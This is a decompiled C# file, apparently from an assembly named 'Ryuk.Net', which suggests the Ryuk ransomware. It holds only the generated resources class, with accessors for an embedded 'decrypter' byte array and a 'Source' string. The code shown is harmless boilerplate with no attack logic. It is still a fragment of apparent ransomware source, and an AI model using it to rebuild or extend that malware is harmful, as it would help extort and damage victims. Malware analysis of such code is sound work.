using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;

namespace Ryuk.Net.Properties
{
	// Token: 0x0200000C RID: 12
	[DebuggerNonUserCode]
	[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
	[CompilerGenerated]
	internal class Resources
	{
		// Token: 0x060000B4 RID: 180 RVA: 0x000090A3 File Offset: 0x000072A3
		internal Resources()
		{
		}

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x060000B5 RID: 181 RVA: 0x000090B0 File Offset: 0x000072B0
		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static ResourceManager ResourceManager
		{
			get
			{
				if (object.ReferenceEquals(Resources.resourceMan, null))
				{
					ResourceManager resourceManager = new ResourceManager("Ryuk.Net.Properties.Resources", typeof(Resources).Assembly);
					Resources.resourceMan = resourceManager;
				}
				return Resources.resourceMan;
			}
		}

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x060000B6 RID: 182 RVA: 0x000090FC File Offset: 0x000072FC
		// (set) Token: 0x060000B7 RID: 183 RVA: 0x00009113 File Offset: 0x00007313
		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static CultureInfo Culture
		{
			get
			{
				return Resources.resourceCulture;
			}
			set
			{
				Resources.resourceCulture = value;
			}
		}

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x060000B8 RID: 184 RVA: 0x0000911C File Offset: 0x0000731C
		internal static byte[] decrypter
		{
			get
			{
				object @object = Resources.ResourceManager.GetObject("decrypter", Resources.resourceCulture);
				return (byte[])@object;
			}
		}

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x060000B9 RID: 185 RVA: 0x0000914C File Offset: 0x0000734C
		internal static string Source
		{
			get
			{
				return Resources.ResourceManager.GetString("Source", Resources.resourceCulture);
			}
		}

		// Token: 0x04000073 RID: 115
		private static ResourceManager resourceMan;

		// Token: 0x04000074 RID: 116
		private static CultureInfo resourceCulture;
	}
}
